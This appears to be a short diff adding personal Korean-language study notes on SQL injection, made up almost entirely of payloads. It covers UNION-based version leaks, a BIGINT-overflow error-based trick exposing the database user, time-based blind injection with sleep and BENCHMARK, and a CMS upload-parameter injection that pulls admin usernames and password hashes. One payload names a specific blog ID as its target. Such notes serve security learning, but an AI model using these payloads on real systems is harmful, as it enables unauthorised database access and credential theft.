@@ -1,0 +1,26 @@
+objid=1168380999999.1 union select unhex(hex(version())) -- and 1=1
+=>OBJID는 BIGINT Overflow Error Based SQL Injection기법을 사용했다
+	mysql> select ~0+!(select*from(select user())x);
+	ERROR 1690 (22003): BIGINT value is out of range in '(~(0) + (not((select 'root@localhost' from dual))))
+INT자료형을 overflow시켜서, 뒤에 오는 SQL함수(user())를 실행시켰다
+
+objid=116838099999" union select unhex(hex(version())) -- "x"="x
+
+blogid=gimisg&objid=1168380' AnD sLeep(3) ANd '1
+=> where id= '1168380' AnD sLeep(3) ANd '1 ' 구문을 의도했음 (1은 참)
+(추가)ANd '1 구문 뒤에 주석을 넣어야줘서 뒤의 나머지 sql이 동작되지 않도록 하는 방법도 있다.
+
+blogid=gimisg&objid=1168380' AnD sLeep(3) ANd '0'='0
+
+
+blogid=gimisg&objid=1168380' aND BeNChMaRK(2999999,Md5(NoW())) AnD '1
+=> benchmark(돌릴 횟수, 돌릴 함수) = 경과시간, 거짓이면 0초, 참이면 경과 시간 반환
+
+
+action=&aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1. 2. 3. 
+(select CONCAT(|. userid. |. pwd) from `#@__admin` limit 0. 1). 5. 6. 7. 8. 9#@`\'` 
+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/oc
+=> 페이지 출력 내용: | userid | pwd (#@__admin테이블의 계정정보로 생성)
+    파일명: 1.jpg
+    파일내용: 페이지에 출력된 쿼리값
+    파일타입: application/octest-stream, MIME타입의 바이너리 자료형으로 확장자는 .bin 이 된다.
